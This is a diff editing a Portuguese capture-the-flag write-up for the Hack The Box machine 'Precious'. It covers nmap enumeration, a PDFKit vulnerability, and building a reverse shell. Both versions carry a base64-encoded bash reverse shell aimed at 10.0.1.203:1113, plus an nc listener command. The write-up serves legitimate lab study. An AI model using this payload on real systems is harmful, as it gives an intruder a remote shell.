@@ -8,14 +8,14 @@ Enumeração - identificando Vulnerabilidade - Exploração - Escalação de Pri
 Como de costume, verifico se no IP fornecido á algum endereço de URL para colocarmos em nossa lista /etc/hosts
 . Adicionamos: precious.htb
 
-Scan usando: *nmap* P -v -sV -A -Pn -oN scanSimples 10.129.97.151 
-
--v: mostrar os resultados em tempo real.  
--sV: Mostrar versões dos serviços encontrados.
--A:  Mais agressividade, trazendo assim informações extras, como detecção de (SO) detecção de versão, varredura de script e traceroute.
+Scan usando: *nmap* -v -sV -A -Pn -oN scanSimples 10.129.97.151 
+```
+-v:  mostrar os resultados em tempo real.  
+-sV: mostrar versões dos serviços encontrados.
+-A:  mais agressividade, trazendo assim informações extras, como detecção de (SO) detecção de versão, varredura de script e traceroute.
 -Pn: desativar a descoberta de host.
 -oN: salvar a saída em um arquivo.
-
+```
 ![Screenshot_1](https://user-images.githubusercontent.com/120592559/208176107-bd3e31ff-0834-4908-9adc-d57eb625e52a.png)
 
 *Porta 80*
@@ -41,13 +41,17 @@ POC: https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
 
 3- EXPLORAÇÃO
 -------
-Diante do cenário anterior, podemos pensar em nosso *Reverse-Shell*.
-1 - Primeiramente, costumo abrir o Burp. 
-2- Logo em seguida tive ajuda de um site para nós ajudarmos a montar nosso *Reverse-Shell* https://www.revshells.com/
-3 - Abrir uma porta de escuta. Usei o `nc -nlvp 1113`
+Com isso já podemos pensar em nosso *Reverse-Shell*.
+```
+#OBS: A outras formas de se fazer isso.
 
+1 - Primeiramente costumo abrir o Burp. 
+2 - Logo em seguida, tive ajuda de um site para nós ajudarmos a montar nosso *Reverse-Shell* -- https://www.revshells.com/
+3 - Abrir uma porta de escuta na máquina local: nc -nlvp 1113
+
+```
 Com o Reverse-Shell montado precisamos codificá-lo em *Base64*: https://www.base64encode.org/
-´L2Jpbi9iYXNoIC1jICdzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjEuMjAzLzExMTMgMD4mMSc=´
+`L2Jpbi9iYXNoIC1jICdzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjEuMjAzLzExMTMgMD4mMSc=`
 
 ![image](https://user-images.githubusercontent.com/120592559/208185372-cb8b0e5b-b9a7-4dee-9ac5-595422d98bc8.png)
 
